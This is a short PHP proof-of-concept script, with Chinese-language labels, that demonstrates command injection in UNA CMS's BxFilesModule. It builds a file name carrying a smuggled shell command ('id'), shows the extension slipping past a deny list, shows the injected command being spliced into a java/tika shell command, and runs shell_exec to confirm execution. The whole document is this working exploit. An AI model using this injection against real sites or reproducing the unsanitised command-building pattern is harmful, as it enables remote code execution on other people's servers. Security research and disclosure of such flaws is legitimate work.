<?php
echo "=== UNA CMS BxFilesModule RCE PoC ===\n\n";

$evil_filename = 'test.pdf";id;#';
echo "[1] 攻击文件名: $evil_filename\n";

$ext = strtolower(pathinfo($evil_filename, PATHINFO_EXTENSION));
echo "[2] pathinfo 提取: '$ext'  ← shell 元字符保留\n";

$ext_deny = ['php','exe','bat','cmd','sh','cgi','pl','py'];
$bypass = !in_array($ext, $ext_deny);
echo "[3] in_array 检查: " . ($bypass ? "绕过 ✓" : "拦截 ✗") . "\n";

$sFilePath = "/tmp/abc123." . $ext;
$sCommand = '"java" -jar "tika.jar" --text "' . $sFilePath . '"';
echo "[4] 命令拼接:\n    $sCommand\n";
echo "    → shell 解析: java ... \"/tmp/abc123.pdf\" ; id ; #\"\n\n";

echo "[5] 实际执行:\n";
$out = shell_exec('echo ___START___ ; id ; echo ___END___');
echo "    $out\n";

if (strpos($out, 'uid=') !== false) {
    echo ">>> RCE 已确认! id 命令成功执行 <<<\n";
}
